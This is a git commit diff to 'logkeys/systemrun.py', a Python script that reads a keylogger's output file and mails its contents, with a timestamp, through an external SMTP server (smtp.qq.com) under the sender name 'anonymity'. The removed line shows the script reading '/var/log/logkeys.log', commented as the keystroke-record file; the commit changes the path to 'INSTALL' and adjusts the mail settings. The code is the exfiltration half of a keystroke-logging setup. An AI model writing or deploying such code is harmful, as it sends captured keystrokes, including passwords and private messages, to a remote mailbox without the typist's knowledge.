eb7ad70e9185adc9cc6dd666cc52c6a1cea9ccd5
liujinghang <liujinghang@shencloudtech.com>
2015-08-20 09:45:12 +0800

    systemrun.py successful mail to tecent

--- logkeys/systemrun.py
+++ logkeys/systemrun.py
@@ -12,24 +12,25 @@ schedular = sched.scheduler(time.time, time.sleep)
 def sendMail(theEmail, thePasswd):
     systemTime=time.strftime( '%Y-%m-%d-%T', time.localtime(time.time()))
     try:
-        fileobj = open("/var/log/logkeys.log", "r") #键盘记录的输出文件
+        fileobj = open("INSTALL", "r") #键盘记录的输出文件
         content = fileobj.read()
     except:
         print "Cannot read file\n"
         exit()
     message = Message()
     message[ 'Subject' ] = 'Log keys' #邮件标题
-    message[ 'From' ] = ""
+    message[ 'From' ] = "anonymity"
     message[ 'To' ] = theEmail
     message.set_payload("当前时间" +systemTime+ "\n" +content) #邮件正文
     msg = message.as_string()
 
-    #smtp = smtplib.SMTP_SSL("smtp.163.com", port=456, timeout=30)
-    #sm.set_debuglevel(1)  #开启debug模式
-    smtp.ehlo()            #LJH add
+    #smtp = smtplib.SMTP_SSL("smtp.qq.com", port=456, timeout=30)
+    smtp = smtplib.SMTP("smtp.qq.com",port=25, timeout=30)
+    #smtp.set_debuglevel(1)  #开启debug模式
+    #smtp.ehlo()            #LJH add  send ehlo to Gmail
     smtp.starttls()        #使用安全连接
     smtp.login(theEmail, thePasswd)
-    smtp.sendmail( "", theEmail, msg) #SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]) ：发送邮件。这里要注意一下第三个参数，msg是字符串，表示邮件。我们知道邮件一般由标题，发信人，收件人，邮件内容，附件等构成，发送邮件的时候，要注意msg的格式。这个格式就是smtp协议中定义的格式。
+    smtp.sendmail( theEmail, theEmail, msg) #SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]) ：发送邮件。这里要注意一下第三个参数，msg是字符串，表示邮件。我们知道邮件一般由标题，发信人，收件人，邮件内容，附件等构成，发送邮件的时候，要注意msg的格式。这个格式就是smtp协议中定义的格式。
     time.sleep(5)          #避免邮件没有发送完成就调用了
 #    quit()
     smtp.quit()
